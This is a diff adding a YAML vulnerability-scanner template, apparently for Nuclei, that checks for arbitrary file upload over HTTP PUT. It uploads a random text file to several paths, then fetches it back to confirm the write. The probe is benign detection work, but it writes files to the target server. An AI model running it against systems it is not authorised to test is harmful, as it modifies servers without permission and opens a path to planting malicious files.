@@ -1,0 +1,44 @@
+id: poc-yaml-file-put
+info:
+  name: PUT Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  r1: "{{rand_base(4)}}"
+  r2: "{{rand_base(20)}}"
+
+http:
+  - raw:
+      - |
+        PUT {{BaseURL}}{{path}}{{r1}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/plain
+
+        {{r2}}
+    payloads:
+      path:
+        - "/"
+        - "/static/"
+        - "/file/"
+    stop-at-first-match: false
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+  - raw:
+      - |
+        GET {{BaseURL}}{{path}}{{r1}}.txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{r2}}"
